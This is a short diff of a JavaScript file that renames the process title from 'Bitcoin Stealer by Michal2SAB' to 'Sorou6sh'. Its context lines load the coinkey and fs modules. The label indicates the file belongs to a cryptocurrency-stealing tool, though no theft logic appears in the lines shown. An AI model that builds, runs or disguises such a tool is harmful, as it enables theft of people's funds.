@@ -1,6 +1,6 @@
 "use strict";
 
-process.title = "Bitcoin Stealer by Michal2SAB";
+process.title = "Sorou6sh";
 
 const CoinKey = require('coinkey');
 const fs = require('fs');
